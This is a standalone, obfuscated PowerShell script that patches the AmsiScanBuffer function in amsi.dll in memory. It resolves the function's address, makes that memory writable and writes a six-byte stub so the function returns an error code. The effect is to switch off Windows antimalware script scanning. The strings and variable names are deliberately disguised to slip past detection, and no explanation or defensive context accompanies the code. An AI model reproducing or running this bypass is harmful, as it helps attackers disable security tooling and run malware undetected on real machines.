$PVP6jaUfuX = @"
using System;
using System.Runtime.InteropServices;
public class PVP6jaUfuX {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr c2RLlBkNLmFUB_YgQY8_, string WtcaSLXpoU5t1);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr iCWkQ6rilW, UIntPtr H7Cq, uint mofLibiB_fsGY6USGz, out uint LfarS);
}
"@

Add-Type $PVP6jaUfuX

$Z0wpRrK = [PVP6jaUfuX]::LoadLibrary("$(('àmsì.'+'dll').NoRMAlize([cHAR]([BYte]0x46)+[ChAr](106+5)+[CHAR]([byte]0x72)+[cHaR](109)+[ChAr]([bytE]0x44)) -replace [chAR]([bYtE]0x5c)+[ChaR](112+54-54)+[ChaR]([ByTE]0x7b)+[cHaR]([BYTe]0x4d)+[chAR]([bYTe]0x6e)+[chAR]([bYTE]0x7d))")
$KogUzgw1dWVm = [PVP6jaUfuX]::GetProcAddress($Z0wpRrK, "$(('ÃmsîScánB'+'ûffèr').nORMaLIZe([cHAr]([BYte]0x46)+[ChAR]([BYTe]0x6f)+[CHar](94+20)+[ChAr]([BYtE]0x6d)+[cHAr](68)) -replace [CHar]([bYtE]0x5c)+[chAR]([byTE]0x70)+[ChAR]([BYTe]0x7b)+[cHaR](77*38/38)+[CHAr](110)+[chaR](5+120))")
$p = 0
[PVP6jaUfuX]::VirtualProtect($KogUzgw1dWVm, [uint32]5, 0x40, [ref]$p)
$YPjH7aFgd = "0xB8"
$xq2vXnrbczfSVbI = "0x57"
$pCe4J42LOBbWki4RFax1 = "0x00"
$_BkKYkM6GsR5uJefQjB4 = "0x07"
$ojPPvBTJaU = "0x80"
$l9M29DAaLh9 = "0xC3"
$UmwfEsnOwYwXYLMx = [Byte[]] ($YPjH7aFgd,$xq2vXnrbczfSVbI,$pCe4J42LOBbWki4RFax1,$_BkKYkM6GsR5uJefQjB4,+$ojPPvBTJaU,+$l9M29DAaLh9)
[System.Runtime.InteropServices.Marshal]::Copy($UmwfEsnOwYwXYLMx, 0, $KogUzgw1dWVm, 6)